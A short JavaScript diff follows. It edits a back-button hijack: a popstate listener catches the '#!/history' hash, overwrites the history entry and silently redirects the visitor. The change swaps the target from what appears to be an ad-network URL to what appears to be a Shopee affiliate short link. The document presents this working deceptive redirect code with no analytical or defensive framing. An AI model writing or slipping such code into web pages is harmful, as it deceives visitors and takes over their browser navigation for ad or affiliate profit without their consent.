@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://forearmdissipatejubilee.com/y0zr19b94g?key=45672489f78c3bc4cba4ebd72c956f2e"); 
+      location.replace("https://shope.ee/9K6QO1Gfx2"); 
     },10); 
   } 
 }, false); 
